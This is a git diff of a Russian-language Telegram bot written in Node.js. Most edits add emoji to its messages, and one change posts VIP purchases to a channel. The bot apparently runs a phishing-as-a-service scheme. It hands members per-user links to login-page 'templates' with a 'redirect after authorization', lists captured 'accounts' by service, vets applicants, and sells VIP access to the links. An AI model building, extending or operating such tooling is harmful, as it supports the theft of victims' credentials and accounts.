@@ -48,11 +48,11 @@ async function ShowLinks(callbackQuery) {
         let btnArray = []
         links.map((link,i) => {
             btnArray[btnArray.length] = [{
-                text: 'Ссылка #'+Number(i+1),
+                text: '🔗 Ссылка #'+Number(i+1),
                 callback_data: 'showLinkInfo' + '_' + link._id
             }]
         })
-        bot.editMessageText(`Выберите одну из ссылок ниже`, {
+        bot.editMessageText(`🔗 Выберите одну из ссылок ниже`, {
             chat_id: callbackQuery.message.chat.id,
             message_id: callbackQuery.message.message_id,
             reply_markup: {
@@ -64,7 +64,7 @@ async function ShowLinks(callbackQuery) {
             parse_mode: 'HTML'
         })
     } else {
-        bot.editMessageText(`К сожалению в данный момент у нас нет ссылок для этого сервиса`, {
+        bot.editMessageText(`😔 К сожалению в данный момент у нас нет ссылок для этого сервиса`, {
             chat_id: callbackQuery.message.chat.id,
             message_id: callbackQuery.message.message_id,
             reply_markup: {
@@ -96,12 +96,12 @@ async function ShowLinkInfo(callbackQuery) {
                     text: '➡️',
                     callback_data: `showNextLinkQuery_${links._id}_${c}`
                 }] : [],
-                user.vip?[]:[{text: 'Разблокировать ссылки',callback_data: 'show_vip'}]
+                user.vip?[]:[{text: '👑Приобрести VIP статус',callback_data: 'show_vip'}]
             ]
         },
         parse_mode: 'HTML'
     }).catch(err => {
-        bot.sendMessage(msg.chat.id, '(Image Error)К сожалению у нас произошла ошибка, пожалуйста обратитесь к администратору')
+        bot.sendMessage(msg.chat.id, '(Image Error)К сожалению у нас произошла ошибка, пожалуйста обратитесь к администратору 😔')
     })
 }
 async function showPrevLink(callbackQuery) {
@@ -135,7 +135,7 @@ async function showPrevLink(callbackQuery) {
                     text: '➡️',
                     callback_data: `showNextLinkQuery_${links._id}_${c}`
                 }]),
-                user.vip?[]:[{text: 'Разблокировать ссылки',callback_data: 'show_vip'}]
+                user.vip?[]:[{text: '👑Приобрести VIP статус',callback_data: 'show_vip'}]
                 //[{text: 'Изменить ссылку после авторизации', callback_data:`changeUrl_${links._id}_${c}`}]
             ]
         },
@@ -158,7 +158,7 @@ async function showNextLink(callbackQuery) {
         message_id: callbackQuery.message.message_id,
         parse_mode: 'HTML'
     })
-    await bot.editMessageCaption(`Шаблон #${c+1} ${links.query[c].name}\n\n${links.query[c].description}\n\n🔗 Постоянная ссылка на шаблон: ${user.vip?`<code>${links.link}/${callbackQuery.message.chat.id.toString(32)}?${c}</code>`:'<b>Для просмотра ссылки приобретите VIP статус</b>'} \n\n\🚪 Переход после авторизации: <code>${links.query[c].redirect}</code>`, {
+    await bot.editMessageCaption(`😺 Шаблон #${c+1} ${links.query[c].name}\n\n${links.query[c].description}\n\n🔗 Постоянная ссылка на шаблон: ${user.vip?`<code>${links.link}/${callbackQuery.message.chat.id.toString(32)}?${c}</code>`:'<b>Для просмотра ссылки приобретите VIP статус</b>'} \n\n\🚪 Переход после авторизации: <code>${links.query[c].redirect}</code>`, {
         chat_id: callbackQuery.message.chat.id,
         message_id: callbackQuery.message.message_id,
         reply_markup: {
@@ -173,7 +173,7 @@ async function showNextLink(callbackQuery) {
                     text: '⬅️',
                     callback_data: `showPrevLinkQuery_${links._id}_${c}`
                 }]),
-                user.vip?[]:[{text: 'Разблокировать ссылки',callback_data: 'show_vip'}]
+                user.vip?[]:[{text: '👑Приобрести VIP статус',callback_data: 'show_vip'}]
                 // [{
                 //     text: 'Изменить ссылку после авторизации',
                 //     callback_data: `changeUrl_${links._id}_${c}`
@@ -289,7 +289,7 @@ async function ShowAccounts(callbackQuery) {
                 parse_mode: 'HTML'
             })
     } else {
-        bot.editMessageText(`🚫 У вас нет аккаунтов ${names[type]}`, {
+        bot.editMessageText(`❌ У вас нет аккаунтов ${names[type]}`, {
             chat_id: callbackQuery.message.chat.id,
             message_id: callbackQuery.message.message_id,
             reply_markup: {
@@ -371,7 +371,7 @@ bot.on("callback_query", async (callbackQuery) => {
                 upsert: true
             })
         }
-        bot.sendMessage(msg.chat.id, 'Спасибо за ответы, перед тем как пользоваться сервисом обязательно прочитайте правила', {
+        bot.sendMessage(msg.chat.id, 'Спасибо за ответы, перед тем как пользоваться сервисом обязательно прочитайте правила 📜', {
             reply_markup: {
                 inline_keyboard: [
                     [{
@@ -406,7 +406,7 @@ bot.on("callback_query", async (callbackQuery) => {
             },
             parse_mode: "HTML"
         })
-        bot.sendMessage(msg.chat.id, 'Ваша заявка успешно отправлена, в ближайшее время вы получите ответ.', {
+        bot.sendMessage(msg.chat.id, '🧑🏼‍💻 Ваша заявка успешно отправлена, в ближайшее время вы получите ответ.', {
             reply_markup: {
                 keyboard: [
                     ["Написать админу"]
@@ -439,7 +439,7 @@ bot.on("callback_query", async (callbackQuery) => {
         }, {
             upsert: true
         })
-        bot.sendMessage(callbackQuery.data.split('_')[1], 'Поздравляем ваша заявка принята!', {
+        bot.sendMessage(callbackQuery.data.split('_')[1], '🥳 Поздравляем ваша заявка принята!', {
             reply_markup: {
                 keyboard: Menu,
                 resize_keyboard: true,
@@ -463,7 +463,7 @@ bot.on("callback_query", async (callbackQuery) => {
         }, {
             upsert: true
         })
-        bot.sendMessage(callbackQuery.data.split('_')[1], `К сожалению ваша заявка не прошла отбор, вы можете попробовать еще раз позже.`, {
+        bot.sendMessage(callbackQuery.data.split('_')[1], `😔 К сожалению ваша заявка не прошла отбор, вы можете попробовать еще раз позже.`, {
             reply_markup: {
                 keyboard: [
                     ["Подать заявку"],
@@ -489,7 +489,7 @@ bot.on("callback_query", async (callbackQuery) => {
         })
     }
     if (callbackQuery.data == 'promo') {
-        bot.editMessageText(`Пожалуйста введите промокод.`, {
+        bot.editMessageText(`🎟 Пожалуйста введите промо-код.`, {
             chat_id: callbackQuery.message.chat.id,
             message_id: callbackQuery.message.message_id
         })
@@ -505,7 +505,7 @@ bot.on("callback_query", async (callbackQuery) => {
     if (callbackQuery.data == 'remove_editmode') {
         bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id)
         bot.answerCallbackQuery(callbackQuery.id, {
-            text: 'Вы успешно вышли из режима ввода'
+            text: '✅ Вы успешно вышли из режима ввода'
         });
         await data.updateOne({
             tg_id: callbackQuery.message.chat.id
@@ -524,7 +524,7 @@ bot.on("callback_query", async (callbackQuery) => {
             reply_markup: {
                 inline_keyboard: [
                     [{
-                        text: `Купить VIP за ${vip[c].price}₽`,
+                        text: `Купить за ${vip[c].price}₽`,
                         callback_data: `buy_vip${c}`
                     }]
                 ]
@@ -561,8 +561,11 @@ bot.on("callback_query", async (callbackQuery) => {
                     chat_id: callbackQuery.message.chat.id,
                     message_id: callbackQuery.message.message_id
                 })
+                bot.sendMessage('-1001189677405', `👑 Пользователь <code>${callbackQuery.message.chat.id}</code> приобрел VIP статус ${vip[c].name}!`,{
+                    parse_mode: 'html'
+                })
             } else {
-                bot.editMessageText('У вас недостсточно средств на балансе, для пополения обратитесь к ' + process.env.Admin, {
+                bot.editMessageText('😔 У вас недостсточно средств на балансе, для пополения обратитесь к ' + process.env.Admin, {
                     chat_id: callbackQuery.message.chat.id,
                     message_id: callbackQuery.message.message_id
                 })
@@ -578,7 +581,7 @@ bot.on("callback_query", async (callbackQuery) => {
     if (callbackQuery.data.split('_')[0] == 'showAccs') {
         if (callbackQuery.data.split('_')[1] == 'all') {
             bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id)
-            bot.sendMessage(msg.chat.id, `👀 Пожалуйста выберите тип аккаунтов`, {
+            bot.sendMessage(msg.chat.id, `📜 Пожалуйста выберите тип аккаунтов`, {
                 reply_markup: {
                     inline_keyboard: [
                         [{
